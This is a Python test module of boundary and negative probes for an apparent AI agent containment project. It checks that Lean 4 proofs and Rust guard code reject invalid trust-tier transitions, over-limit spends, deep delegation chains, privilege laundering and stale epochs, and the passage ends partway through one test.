"""Tier 2: Boundary Value Analysis & Negative Probes (76 tests across F1-F14)."""

from __future__ import annotations

import os
from pathlib import Path
import re
import tempfile
import tomllib
import unittest

from . import common


def _read_repo_text(rel_path: str) -> str:
    return (common.REPO_ROOT / rel_path).read_text(encoding="utf-8")


_HEX64 = "a" * 64
_HEX63 = "a" * 63


def _extract_lean_structure_fields(lean_text: str, struct_name: str) -> list[tuple[str, str]]:
    """Extract `(field_name, field_type)` pairs from `structure <struct_name> where`."""
    m = re.search(rf"^\s*structure\s+{re.escape(struct_name)}\b[^\n]*?\bwhere\b", lean_text, re.MULTILINE)
    if not m:
        return []
    fields: list[tuple[str, str]] = []
    stop_re = re.compile(
        r"^(?:deriving|end|def|theorem|lemma|structure|inductive|namespace|section|instance|private|protected)\b"
    )
    for line in lean_text[m.end() :].splitlines():
        s = line.strip()
        if not s:
            continue
        if stop_re.match(s):
            break
        fm = re.match(r"^([A-Za-z_][A-Za-z0-9_']*)\s*:\s*(.+?)(?:\s*:=\s*.*)?$", s)
        if fm:
            fields.append((fm.group(1), fm.group(2).strip()))
    return fields


def _default_lean_val_for_type(
    lean_text: str,
    ftype: str,
    str_val: str = '"ledger_arm"',
    bool_val: str = "true",
) -> str:
    t = ftype.strip()
    if t == "Nat":
        return "1"
    if t == "Int":
        return "0"
    if t == "Bool":
        return bool_val
    if t == "String":
        return str_val
    if t.startswith("List "):
        return "[]"
    if t.startswith("Option "):
        inner = t[len("Option ") :].strip()
        if inner == "String":
            return f"some {str_val}"
        return "none"
    if "→ Bool" in t or "-> Bool" in t:
        return "(fun _ => true)"
    if t == "ArmRole":
        return ".AccountingLedgerWrite"
    if t == "TrustTier":
        return ".Worker"
    if t == "PrincipalId":
        ctors = common.parse_lean_inductive_constructors(lean_text, t)
        if "agent" in ctors:
            return f'.agent {str_val}'
        if "reserved" in ctors:
            return ".reserved .AccountingLedgerWrite"
    ctors = common.parse_lean_inductive_constructors(lean_text, t)
    if ctors:
        return f".{ctors[0]}"
    return "{}"


def _rust_literal_spans(cleaned: str) -> list[tuple[int, int]]:
    spans: list[tuple[int, int]] = []
    pos = 0
    n = len(cleaned)
    while pos < n:
        lit_end = common._advance_rust_literal(cleaned, pos)
        if lit_end is not None:
            spans.append((pos, lit_end))
            pos = lit_end
        else:
            pos += 1
    return spans


def _extract_rust_fn_body(rust_text: str, fn_name: str) -> str | None:
    """Extract the brace-delimited body of `fn <fn_name>(...) ... { ... }` from Rust source."""
    cleaned = common.strip_rust_comments(rust_text)
    lit_spans = _rust_literal_spans(cleaned)
    fn_pat = re.compile(
        rf"\b(?:pub(?:\s*\([^)]+\))?\s+)?(?:(?:async|unsafe|const)\s+)*(?:extern\s+(?:\"[^\"]*\"\s+)?)?fn\s+{re.escape(fn_name)}\b"
    )
    n = len(cleaned)

    for m in fn_pat.finditer(cleaned):
        if any(start <= m.start() < end for start, end in lit_spans):
            continue
        pos = m.end()
        paren_depth = 0
        bracket_depth = 0
        angle_depth = 0
        brace_start = -1

        while pos < n:
            lit_end = common._advance_rust_literal(cleaned, pos)
            if lit_end is not None:
                pos = lit_end
                continue
            if cleaned[pos : pos + 2] == "->":
                pos += 2
                continue
            ch = cleaned[pos]
            if ch == "(":
                paren_depth += 1
            elif ch == ")":
                paren_depth = max(0, paren_depth - 1)
            elif ch == "[":
                bracket_depth += 1
            elif ch == "]":
                bracket_depth = max(0, bracket_depth - 1)
            elif paren_depth == 0 and bracket_depth == 0:
                if ch == "<":
                    angle_depth += 1
                elif ch == ">":
                    angle_depth = max(0, angle_depth - 1)
                elif angle_depth == 0:
                    if ch == ";":
                        break
                    if ch == "{":
                        brace_start = pos
                        break
            pos += 1

        if brace_start == -1:
            continue

        depth = 1
        pos = brace_start + 1
        while pos < n and depth > 0:
            lit_end = common._advance_rust_literal(cleaned, pos)
            if lit_end is not None:
                pos = lit_end
                continue
            ch = cleaned[pos]
            if ch == "{":
                depth += 1
            elif ch == "}":
                depth -= 1
                if depth == 0:
                    return cleaned[brace_start + 1 : pos]
            pos += 1

    return None


def _build_lean_struct_literal(
    lean_text: str,
    struct_name: str,
    overrides: dict[str, str] | None = None,
    str_val: str = '"ledger_arm"',
    bool_val: str = "true",
) -> str:
    overrides = overrides or {}
    fields = _extract_lean_structure_fields(lean_text, struct_name)
    if not fields:
        if overrides:
            items = [f"{k} := {v}" for k, v in overrides.items()]
            return "{ " + ", ".join(items) + " }"
        return "{}"
    parts: list[str] = []
    for fname, ftype in fields:
        if fname in overrides:
            parts.append(f"{fname} := {overrides[fname]}")
        else:
            parts.append(f"{fname} := {_default_lean_val_for_type(lean_text, ftype, str_val=str_val, bool_val=bool_val)}")
    return "{ " + ", ".join(parts) + " }"


def _assert_lean_mismatch_failure(test_case: unittest.TestCase, res: common.SubprocessResult) -> None:
    test_case.assertNotEqual(res.returncode, 0, f"Expected Lean proof/type mismatch failure:\n{res.combined_output}")
    out_lower = res.combined_output.lower()
    test_case.assertNotIn("unknown identifier", out_lower, f"Probe had symbol resolution error:\n{res.combined_output}")
    test_case.assertNotIn("unknown constant", out_lower, f"Probe had symbol resolution error:\n{res.combined_output}")
    test_case.assertRegex(
        out_lower,
        r"type mismatch|failed|contradiction|unsolved goals|not definitionally equal|proved that the proposition|is false",
        f"Unexpected Lean failure reason:\n{res.combined_output}",
    )


class TestTier2Boundaries(unittest.TestCase):
    """Tier 2 boundary & negative probes (>= 5 per feature F1-F14)."""

    # =======================================================================
    # F1: Lean 4 Toolchain & Lake Project Negative Probes (6 tests)
    # =======================================================================

    def test_f1_b01_malformed_lakefile_toml_rejected(self) -> None:
        """F1-BVA: Malformed lakefile.toml syntax raises TOMLDecodeError."""
        malformed = 'name = "AgentOctopusFormal"\n[leanOptions\nautoImplicit = false\n'
        with self.assertRaises(tomllib.TOMLDecodeError):
            common.parse_toml_text(malformed)

    def test_f1_b02_mathlib_dependency_rejected_by_zero_dep_policy(self) -> None:
        """F1-BVA: Synthetic lakefile.toml declaring external [[require]] fails zero-dep gate."""
        bad_toml = (
            'name = "AgentOctopusFormal"\n'
            'version = "0.1.0"\n'
            'defaultTargets = ["AgentOctopusFormal"]\n'
            '[leanOptions]\n'
            'autoImplicit = false\n'
            '[[lean_lib]]\n'
            'name = "AgentOctopusFormal"\n'
            '[[require]]\n'
            'name = "mathlib"\n'
            'scope = "leanprover-community"\n'
        )
        parsed = common.parse_toml_text(bad_toml)
        errors = common.validate_lakefile_zero_deps(parsed)
        self.assertTrue(errors, "Expected zero-dep validator to reject [[require]]")
        self.assertTrue(any("require" in e for e in errors), f"Unexpected errors: {errors}")

    def test_f1_b03_auto_implicit_false_rejects_unbound_identifier(self) -> None:
        """F1-BVA: Unbound identifier with `autoImplicit = false` is rejected by Lean compiler."""
        probe = "set_option autoImplicit false in\ndef badAuto (x) := x\n"
        res = common.run_lean_probe(probe, use_lake_env=False)
        self.assertNotEqual(res.returncode, 0, "Expected unbound implicit to fail with autoImplicit=false")

    def test_f1_b04_missing_milestone_file_fails_closed_when_strict(self) -> None:
        """F1-BVA: require_milestone_file fails closed (AssertionError) in strict mode and skips in progressive mode."""
        rel = "formal/AgentOctopusFormal/__DoesNotExist__.lean"
        with self.assertRaises(AssertionError):
            common.require_milestone_file(rel, "F1", progressive=False)
        with self.assertRaises(unittest.SkipTest):
            common.require_milestone_file(rel, "F1", progressive=True)

    def test_f1_b05_missing_lake_toolchain_fails_closed_when_strict(self) -> None:
        """F1-BVA: require_lake_toolchain fails closed when PATH, ELAN_HOME, and home/.elan/bin have no lake/lean."""
        with tempfile.TemporaryDirectory(prefix="ao_empty_elan_") as empty_dir:
            saved = {k: os.environ.get(k) for k in ("PATH", "ELAN_HOME", "USERPROFILE", "HOME")}
            try:
                os.environ["PATH"] = empty_dir
                os.environ["ELAN_HOME"] = empty_dir
                os.environ["USERPROFILE"] = empty_dir
                os.environ["HOME"] = empty_dir
                with self.assertRaises(AssertionError):
                    common.require_lake_toolchain(progressive=False)
                with self.assertRaises(unittest.SkipTest):
                    common.require_lake_toolchain(progressive=True)
            finally:
                for k, val in saved.items():
                    if val is None:
                        os.environ.pop(k, None)
                    else:
                        os.environ[k] = val

    def test_f1_b06_staging_temp_dir_lake_exclusion_probe(self) -> None:
        """F1-BVA: Synthetic .lake/junk.olean and formal/.lake/packages/foo.olean match .gitignore and EXCLUDE_DIRS."""
        self.assertTrue(common.git_check_ignore(".lake/junk.olean"))
        self.assertTrue(common.git_check_ignore("formal/.lake/packages/foo.olean"))
        pkg_text = _read_repo_text("scripts/package_agent_octopus.py")
        self.assertRegex(pkg_text, r"""["']\.lake["']""")

    # =======================================================================
    # F2: Core Types & Trust Tier Negative Probes (5 tests)
    # =======================================================================

    def test_f2_b01_non_exhaustive_arm_role_match_rejected_by_lean(self) -> None:
        """F2-BVA: Non-exhaustive match on ArmRole (1 of 18 cases) fails Lean compilation."""
        common.require_milestone_file("formal/AgentOctopusFormal/CoreTypes.lean", "F2")
        probe = (
            "import AgentOctopusFormal.CoreTypes\n"
            "def badMap : AgentOctopusFormal.ArmRole -> AgentOctopusFormal.TrustTier\n"
            "  | .UntrustedDocIngest => .Untrusted\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertNotEqual(res.returncode, 0, "Expected missing-cases error on 1-arm ArmRole match")
        self.assertRegex(res.combined_output.lower(), r"missing cases|error")

    def test_f2_b02_wrong_arm_role_count_17_rejected_by_lean(self) -> None:
        """F2-BVA: Asserting ArmRole.all.length = 17 fails Lean typechecking."""
        common.require_milestone_file("formal/AgentOctopusFormal/CoreTypes.lean", "F2")
        probe = (
            "import AgentOctopusFormal.CoreTypes\n"
            "example : AgentOctopusFormal.ArmRole.all.length = 17 := rfl\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertNotEqual(res.returncode, 0, "ArmRole.all.length = 17 should fail")

    def test_f2_b03_privileged_le_untrusted_rejected_by_lean(self) -> None:
        """F2-BVA: Asserting PrivilegedSink <= Untrusted fails Lean decide."""
        common.require_milestone_file("formal/AgentOctopusFormal/CoreTypes.lean", "F2")
        probe = (
            "import AgentOctopusFormal.CoreTypes\n"
            "example : AgentOctopusFormal.TrustTier.PrivilegedSink <= "
            "AgentOctopusFormal.TrustTier.Untrusted := by decide\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertNotEqual(res.returncode, 0, "PrivilegedSink <= Untrusted must fail")

    def test_f2_b04_rust_role_trust_tier_has_zero_wildcard_arm(self) -> None:
        """F2-BVA: Rust role_trust_tier in mesh_guard.rs has no `_ =>` wildcard fallback."""
        rust_text = common.strip_rust_comments(_read_repo_text("src/containment_ring/mesh_guard.rs"))
        m = re.search(r"pub\s+fn\s+role_trust_tier\b.*?^\}", rust_text, re.DOTALL | re.MULTILINE)
        self.assertIsNotNone(m, "role_trust_tier not found in mesh_guard.rs")
        body = m.group(0)
        self.assertIsNone(re.search(r"_\s*=>", body), "Wildcard `_ =>` forbidden in role_trust_tier")

    def test_f2_b05_tier_partition_counts_exact_5_9_4(self) -> None:
        """F2-BVA: Partition of 18 ArmRoles into Untrusted(5), Worker(9), PrivilegedSink(4) is disjoint and complete."""
        lean_path = common.require_milestone_file("formal/AgentOctopusFormal/CoreTypes.lean", "F2")
        lean_text = common.strip_lean_comments(lean_path.read_text(encoding="utf-8"))
        arms = re.findall(
            r"\|\s*\.([A-Za-z0-9_]+)\s*=>\s*\.(Untrusted|Worker|PrivilegedSink)\b",
            lean_text,
        )
        roles = [r for r, _ in arms]
        self.assertEqual(len(roles), len(set(roles)), "Duplicate roleTrustTier match arm")
        self.assertEqual(sum(1 for _, t in arms if t == "Untrusted"), 5)
        self.assertEqual(sum(1 for _, t in arms if t == "Worker"), 9)
        self.assertEqual(sum(1 for _, t in arms if t == "PrivilegedSink"), 4)

    # =======================================================================
    # F3: Arm FSM & PolicyGuard Boundary Probes (5 tests)
    # =======================================================================

    def test_f3_b01_quarantined_to_completed_rejected_by_lean(self) -> None:
        """F3-BVA: Transition Quarantined -> Completed is rejected by Lean."""
        common.require_milestone_file("formal/AgentOctopusFormal/FsmContainment.lean", "F3")
        probe = (
            "import AgentOctopusFormal.FsmContainment\n"
            "example : AgentOctopusFormal.isValidTransition .Quarantined .Completed = true := rfl\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertNotEqual(res.returncode, 0)

    def test_f3_b02_skip_created_to_completed_rejected_by_lean(self) -> None:
        """F3-BVA: Skipping intermediate states (Created -> Completed) is rejected by Lean."""
        common.require_milestone_file("formal/AgentOctopusFormal/FsmContainment.lean", "F3")
        probe = (
            "import AgentOctopusFormal.FsmContainment\n"
            "example : AgentOctopusFormal.isValidTransition .Created .Completed = true := rfl\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertNotEqual(res.returncode, 0)

    def test_f3_b03_amount_10_000_001_rejected_while_10_000_000_accepted(self) -> None:
        """F3-BVA: PolicyGuard accepts 10_000_000 cents ($100k) and rejects 10_000_001 cents ($100k+1c)."""
        common.require_milestone_file("formal/AgentOctopusFormal/FsmContainment.lean", "F3")
        probe_ok = (
            "import AgentOctopusFormal.FsmContainment\n"
            "example : AgentOctopusFormal.enforceArtifact {} "
            f'{{ amountCents := 10_000_000, currency := "USD", merkleRoot := "{_HEX64}" }} = true := rfl\n'
            "example : AgentOctopusFormal.enforceArtifact {} "
            f'{{ amountCents := 10_000_001, currency := "USD", merkleRoot := "{_HEX64}" }} = false := rfl\n'
        )
        res_ok = common.run_lean_probe(probe_ok, use_lake_env=True)
        self.assertEqual(res_ok.returncode, 0, res_ok.combined_output)

        probe_bad = (
            "import AgentOctopusFormal.FsmContainment\n"
            "example : AgentOctopusFormal.enforceArtifact {} "
            f'{{ amountCents := 10_000_001, currency := "USD", merkleRoot := "{_HEX64}" }} = true := rfl\n'
        )
        res_bad = common.run_lean_probe(probe_bad, use_lake_env=True)
        self.assertNotEqual(res_bad.returncode, 0)

    def test_f3_b04_step_budget_6_exceeds_5_and_wrong_currency_rejected(self) -> None:
        """F3-BVA: maxStepBudget=6 (>5) and currency='EUR' fail PolicyGuard in Lean."""
        common.require_milestone_file("formal/AgentOctopusFormal/FsmContainment.lean", "F3")
        probe = (
            "import AgentOctopusFormal.FsmContainment\n"
            "example : AgentOctopusFormal.enforceDirective {} "
            '{ sourceUri := "s3://invoices/inv1", maxStepBudget := 5 } = true := by first | decide | native_decide\n'
            "example : AgentOctopusFormal.enforceDirective {} "
            '{ sourceUri := "s3://invoices/inv1", maxStepBudget := 6 } = false := by first | decide | native_decide\n'
            "example : AgentOctopusFormal.enforceArtifact {} "
            f'{{ amountCents := 100, currency := "EUR", merkleRoot := "{_HEX64}" }} = false := by decide\n'
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertEqual(res.returncode, 0, res.combined_output)

    def test_f3_b05_zero_amount_and_63_char_merkle_root_rejected(self) -> None:
        """F3-BVA: SchemaGuard rejects amount=0 and PolicyGuard rejects 63-hex merkleRoot."""
        common.require_milestone_file("formal/AgentOctopusFormal/FsmContainment.lean", "F3")
        probe = (
            "import AgentOctopusFormal.FsmContainment\n"
            "example : AgentOctopusFormal.validateSchemaFields "
            f'{{ amountCents := 0, currency := "USD", merkleRoot := "{_HEX64}" }} = false := rfl\n'
            "example : AgentOctopusFormal.enforceArtifact {} "
            f'{{ amountCents := 1, currency := "USD", merkleRoot := "{_HEX63}" }} = false := rfl\n'
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertEqual(res.returncode, 0, res.combined_output)
        self.assertIn("amount_cents == 0", _read_repo_text("src/deterministic/schema_guard.rs"))
        self.assertIn("merkle_root.len() != 64", _read_repo_text("src/deterministic/policy_guard.rs"))

    # =======================================================================
    # F4: Homological Mesh & Delegation Boundary Probes (5 tests)
    # =======================================================================

    def test_f4_b01_two_hop_proxy_laundering_rejected_by_lean(self) -> None:
        """F4-BVA: Untrusted -> Worker -> PrivilegedSink proxy laundering is rejected by Lean."""
        common.require_milestone_file("formal/AgentOctopusFormal/HomologicalMesh.lean", "F4")
        probe = (
            "import AgentOctopusFormal.HomologicalMesh\n"
            "example : (AgentOctopusFormal.auditRoleChain "
            "[.UntrustedDocIngest, .NetworkEgress, .AccountingLedgerWrite]).allowed = true := rfl\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertNotEqual(res.returncode, 0)

    def test_f4_b02_chain_length_1_and_18_rejected_by_lean(self) -> None:
        """F4-BVA: Role chains of length 1 (<2) and 18 (> MAX_RELAY_HOPS+1=17) are rejected."""
        common.require_milestone_file("formal/AgentOctopusFormal/HomologicalMesh.lean", "F4")
        probe = (
            "import AgentOctopusFormal.HomologicalMesh\n"
            "example : (AgentOctopusFormal.auditRoleChain [.NetworkEgress]).allowed = false := rfl\n"
            "example : (AgentOctopusFormal.auditRoleChain (List.replicate 18 .NetworkEgress)).allowed = false := rfl\n"
            "example : (AgentOctopusFormal.auditRoleChain (List.replicate 17 .NetworkEgress)).allowed = true := rfl\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertEqual(res.returncode, 0, res.combined_output)

    def test_f4_b03_delegation_depth_3_exceeds_guard_2_in_lean(self) -> None:
        """F4-BVA: Delegation chain depth 3 (>2) returns DelegationScopeViolation while depth 2 succeeds."""
        common.require_milestone_file("formal/AgentOctopusFormal/HomologicalMesh.lean", "F4")
        probe = (
            "import AgentOctopusFormal.HomologicalMesh\n"
            'example : AgentOctopusFormal.validateDelegation {} .NetworkEgress '
            '[.NetworkEgress, .NetworkEgress] .NetworkEgress "http_egress" = .ok () := rfl\n'
            'example : AgentOctopusFormal.validateDelegation {} .NetworkEgress '
            '[.NetworkEgress, .NetworkEgress, .NetworkEgress] .NetworkEgress "http_egress" = '
            ".error .DelegationScopeViolation := rfl\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertEqual(res.returncode, 0, res.combined_output)

    def test_f4_b04_autonomous_protocol_research_empty_tools_rejected(self) -> None:
        """F4-BVA: AutonomousProtocolResearch has empty permitted tools in Lean and Rust."""
        common.require_milestone_file("formal/AgentOctopusFormal/HomologicalMesh.lean", "F4")
        probe = (
            "import AgentOctopusFormal.HomologicalMesh\n"
            'example : AgentOctopusFormal.validateDelegation {} .AutonomousProtocolResearch '
            '[] .NetworkEgress "http_egress" = .error .DelegationScopeViolation := rfl\n'
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertEqual(res.returncode, 0, res.combined_output)
        rust_del = _read_repo_text("src/security/delegation.rs")
        fn_body = _extract_rust_fn_body(rust_del, "permitted_tools_for_role")
        self.assertIsNotNone(fn_body, "permitted_tools_for_role not found in delegation.rs")
        assert fn_body is not None
        self.assertRegex(rust_del, r"ArmRole::AutonomousProtocolResearch\s*=>\s*\{\s*(?://[^\n]*)?\s*\}")
        m_arm = re.search(r"ArmRole::AutonomousProtocolResearch\s*=>\s*\{([^}]*)\}", fn_body)
        self.assertIsNotNone(m_arm, "AutonomousProtocolResearch match arm not found in permitted_tools_for_role")
        assert m_arm is not None
        self.assertEqual(m_arm.group(1).strip(), "", f"Expected empty arm for AutonomousProtocolResearch, got: {m_arm.group(1)!r}")
        self.assertNotIn("tools.insert", m_arm.group(1))

    def test_f4_b05_sticky_taint_cannot_wash_back_to_worker(self) -> None:
        """F4-BVA: Sticky Untrusted taint cannot be upgraded back to Worker by PrivilegedSink."""
        common.require_milestone_file("formal/AgentOctopusFormal/HomologicalMesh.lean", "F4")
        probe = (
            "import AgentOctopusFormal.HomologicalMesh\n"
            "example : AgentOctopusFormal.updateTaintFloor "
            "{ floor := .Untrusted, provenance := [] } .PrivilegedSink = .Worker := rfl\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertNotEqual(res.returncode, 0)

    # =======================================================================
    # F5: Epoch Autotomy & Dirac/3-Layer Boundary Probes (5 tests — M2)
    # =======================================================================

    def test_f5_b01_stale_epoch_probe_cannot_bypass_revoked_theorem(self) -> None:
        """F5-BVA: Revoked/stale epoch after severAndRegenerate evaluates to false in Lean (and = true fails)."""
        lean_path = common.require_milestone_file("formal/AgentOctopusFormal/EpochAutotomy.lean", "F5")
        lean_text = common.strip_lean_comments(lean_path.read_text(encoding="utf-8"))
        self.assertRegex(lean_text, r"\btheorem\s+revoked_epoch_never_valid\b")
        self.assertRegex(lean_text, r"\bdef\s+severAndRegenerate\b")

        m_fn = re.search(
            r"\bdef\s+(isValidEpoch|verifyEpoch|isEpochValid|checkEpoch|validateEpoch|acceptsEpoch)\b([\s\S]{0,200}?):\s*Bool\s*:=",
            lean_text,
        )
        self.assertIsNotNone(m_fn, "EpochAutotomy.lean must define a Bool epoch validity check function")
        fn_name = m_fn.group(1)
        sig_text = m_fn.group(2)

        fields = _extract_lean_structure_fields(lean_text, "ArmEpochState")
        gen_field = next(
            (fname for fname, ftype in fields if ftype == "Nat" and re.search(r"gen|epoch", fname, re.IGNORECASE)),
            "generation",
        )
        m_init = re.search(
            r"\bdef\s+ArmEpochState\.init\b([^\n]*?):\s*ArmEpochState\s*:=",
            lean_text,
        )
        if m_init:
            init_sig = m_init.group(1)
            req_nat_args = [
                p
                for p in re.findall(r"\(([^)]+)\)", init_sig)
                if ":=" not in p and "Nat" in p
            ]
            if req_nat_args:
                init_expr = "ArmEpochState.init " + " ".join("1" for _ in req_nat_args)
            else:
                init_expr = "ArmEpochState.init"
        else:
            init_expr = _build_lean_struct_literal(lean_text, "ArmEpochState", bool_val="false")

        nat_pos = sig_text.find("Nat")
        state_pos = sig_text.find("ArmEpochState")
        nat_first = nat_pos != -1 and (state_pos == -1 or nat_pos < state_pos)
        if fields and any(f[0] == gen_field for f in fields):
            stale_expr = f"probeInit.{gen_field}"
            fresh_expr = f"probeRegen.{gen_field}"
        else:
            stale_expr = "0"
            fresh_expr = "1"
        call_stale = (
            f"{fn_name} {stale_expr} probeRegen" if nat_first else f"{fn_name} probeRegen {stale_expr}"
        )
        call_fresh = (
            f"{fn_name} {fresh_expr} probeRegen" if nat_first else f"{fn_name} probeRegen {fresh_expr}"
        )

        header = (
            "import AgentOctopusFormal.EpochAutotomy\n"
            "open AgentOctopusFormal in\n"
            f"def probeInit : ArmEpochState := {init_expr}\n"
            "open AgentOctopusFormal in\n"
            "def probeRegen : ArmEpochState := severAndRegenerate probeInit\n"
        )
        probe_ok = (
            header
            + f"open AgentOctopusFormal in\nexample : {call_stale} = false := by first | rfl | decide\n"
            + f"open AgentOctopusFormal in\nexample : {call_fresh} = true := by first | rfl | decide\n"
        )
        res_ok = common.run_lean_probe(probe_ok, use_lake_env=True)
        self.assertEqual(res_ok.returncode, 0, f"Stale epoch evaluation failed:\n{res_ok.combined_output}")

        probe_bad = header + f"open AgentOctopusFormal in\nexample : {call_stale} = true := by first | rfl | decide\n"
        res_bad = common.run_lean_probe(probe_bad, use_lake_env=True)
        _assert_lean_mismatch_failure(self, res_bad)

    def test_f5_b02_dirac_replay_prohibited_in_lean_and_rust(self) -> None:
        """F5-BVA: DiracDeltaCapabilityTicket enforces atomic single-use CAS and Lean proves dirac_single_use_no_replay."""
        common.require_milestone_file("formal/AgentOctopusFormal/EpochAutotomy.lean", "F5")
        rust_prim = _read_repo_text("src/containment_ring/primitives.rs")
        self.assertIn("LAW3_DIRAC_REPLAY_BLOCKED", rust_prim)
        self.assertIn("compare_exchange(0, 1", rust_prim)
        probe = (
            "import AgentOctopusFormal.EpochAutotomy\n"
            "#check @AgentOctopusFormal.dirac_single_use_no_replay\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertEqual(res.returncode, 0, res.combined_output)

    def test_f5_b03_dirac_window_clamped_1_to_5_000_000_us(self) -> None:
        """F5-BVA: Rust Dirac window clamps [1, 5_000_000] us and rejects > window expiry."""
        common.require_milestone_file("formal/AgentOctopusFormal/EpochAutotomy.lean", "F5")
        rust_prim = _read_repo_text("src/containment_ring/primitives.rs")
        self.assertIn("window_us.clamp(1, 5_000_000)", rust_prim)
        self.assertIn("LAW3_DIRAC_WINDOW_EXPIRED", rust_prim)

    def test_f5_b04_three_layer_gate_requires_kernel_process_in_job(self) -> None:
        """F5-BVA: IndependentTrustBoundaryVerifier requires l1_ok && l2_ok && l3_ok with kernel_process_in_job."""
        common.require_milestone_file("formal/AgentOctopusFormal/EpochAutotomy.lean", "F5")
        rust_prim = _read_repo_text("src/containment_ring/primitives.rs")
        self.assertIn("kernel_process_in_job", rust_prim)
        self.assertIn("l1_ok && l2_ok && l3_ok", rust_prim)

    def test_f5_b05_sec_ring_01_pid_guard_blocks_system_and_self_pids(self) -> None:
        """F5-BVA: verify_terminable_child_pid blocks pid <= 4 and self PID."""
        common.require_milestone_file("formal/AgentOctopusFormal/EpochAutotomy.lean", "F5")
        rust_arm = _read_repo_text("src/containment_ring/arm_ring.rs")
        body = _extract_rust_fn_body(rust_arm, "verify_terminable_child_pid")
        self.assertIsNotNone(body, "verify_terminable_child_pid not found in arm_ring.rs")
        assert body is not None
        inline_ok = bool(re.search(r"pid\s*<=\s*4\s*\|\|\s*pid\s*==\s*std::process::id\(\)", body))
        bound_ok = bool(
            re.search(
                r"let\s+([A-Za-z_][A-Za-z0-9_]*)\s*(?::\s*u32\s*)?=\s*std::process::id\(\)\s*;[\s\S]*?pid\s*<=\s*4\s*\|\|\s*pid\s*==\s*\1\b",
                body,
            )
        )
        self.assertTrue(
            inline_ok or bound_ok,
            f"verify_terminable_child_pid must guard `pid <= 4 || pid == self_pid`:\n{body}",
        )

        trait_plus_impl = (
            "trait Guard {\n"
            "    fn verify_terminable_child_pid(pid: u32) -> Result<(), ()>;\n"
            "}\n"
            "fn other() { let x = 1; }\n"
            'fn raw_str_holder() -> &\'static str { r#"// } /* still literal */"# }\n'
            "impl Guard for Ring {\n"
            "    pub fn verify_terminable_child_pid(pid: u32) -> Result<(), ()> {\n"
            "        if pid <= 4 || pid == std::process::id() { return Err(()); }\n"
            "        Ok(())\n"
            "    }\n"
            "}\n"
        )
        extracted = _extract_rust_fn_body(trait_plus_impl, "verify_terminable_child_pid")
        self.assertIsNotNone(extracted)
        assert extracted is not None
        self.assertIn("pid <= 4", extracted)
        self.assertNotIn("let x = 1", extracted)
        self.assertIn('r#"// } /* still literal */"#', common.strip_rust_comments(trait_plus_impl))

    # =======================================================================
    # F6: CAGE NoDirectBind, Seal & CBF Boundary Probes (6 tests — M2)
    # =======================================================================

    def test_f6_b01_non_exhaustive_bfs_phase_rejected_by_lean(self) -> None:
        """F6-BVA: Non-exhaustive match on 7-variant BfsPhase fails Lean compilation."""
        common.require_milestone_file("formal/AgentOctopusFormal/CageNoDirectBind.lean", "F6")
        probe = (
            "import AgentOctopusFormal.CageNoDirectBind\n"
            "def badPhase : AgentOctopusFormal.BfsPhase -> Nat\n"
            "  | .Initial => 0\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertNotEqual(res.returncode, 0)

    def test_f6_b02_ungated_counterexample_has_violation_not_zero(self) -> None:
        """F6-BVA: FormalBfsModel ungated counterexample has 17 states and >=1 violation."""
        common.require_milestone_file("formal/AgentOctopusFormal/CageNoDirectBind.lean", "F6")
        rust_bfs = _read_repo_text("src/security/cage_governance/no_direct_bind_proof.rs")
        self.assertIn("reachable_count == 34", rust_bfs)
        self.assertIn("17", rust_bfs)
        self.assertIn("seal_present == false", rust_bfs)

    def test_f6_b03_skipped_tier_31_states_zero_executed(self) -> None:
        """F6-BVA: Skipped-tier BFS model explores 31 states with executed_count == 0."""
        common.require_milestone_file("formal/AgentOctopusFormal/CageNoDirectBind.lean", "F6")
        lean_text = (common.FORMAL_PKG_DIR / "CageNoDirectBind.lean").read_text(encoding="utf-8")
        self.assertRegex(lean_text, r"\b31\b")
        rust_bfs = _read_repo_text("src/security/cage_governance/no_direct_bind_proof.rs")
        self.assertIn("explore_skipped_tier_model", rust_bfs)

    def test_f6_b04_routing_seal_rejects_expired_ttl_31_and_drift_6(self) -> None:
        """F6-BVA: CageRoutingSeal enforces TTL=30s, drift=5s, and single-use AlreadyConsumed."""
        common.require_milestone_file("formal/AgentOctopusFormal/CageNoDirectBind.lean", "F6")
        rust_seal = _read_repo_text("src/security/cage_governance/routing_seal.rs")
        for sym in ("Expired", "FutureTimestamp", "AlreadyConsumed", "UnanchoredEvidence"):
            self.assertIn(sym, rust_seal)

    def test_f6_b05_cbf_rejects_invalid_gamma_and_floor_breach(self) -> None:
        """F6-BVA: CbfSafetyEngine enforces gamma in (0, 1], CBF_EPSILON=1e-9, FloorBreach, DecayRateExceeded."""
        common.require_milestone_file("formal/AgentOctopusFormal/CageNoDirectBind.lean", "F6")
        rust_cbf = _read_repo_text("src/security/cage_governance/cbf_fiscal.rs")
        for sym in ("CBF_EPSILON", "FloorBreach", "DecayRateExceeded", "StaleFenceEpoch", "SequenceReplay"):
            self.assertIn(sym, rust_cbf)

    def test_f6_b06_debit_ledger_forbids_rollback_after_confirm(self) -> None:
        """F6-BVA: DebitLedger forbids rollback after confirm (AlreadyCommitted) and proves debit_no_leakage."""
        common.require_milestone_file("formal/AgentOctopusFormal/CageNoDirectBind.lean", "F6")
        rust_cbf = _read_repo_text("src/security/cage_governance/cbf_fiscal.rs")
        self.assertIn("AlreadyCommitted", rust_cbf)
        self.assertIn("CurrentStateUnsafe", rust_cbf)

    # =======================================================================
    # F7: Cedar PARC & Dogwood Temporal Boundary Probes (5 tests — M3)
    # =======================================================================

    def test_f7_b01_cedar_spend_10_000_001_denied(self) -> None:
        """F7-BVA: Cedar default policy & CedarGate enforce <= 10_000_000 cents ($100k)."""
        common.require_milestone_file("formal/AgentOctopusFormal/CedarAndTemporal.lean", "F7")
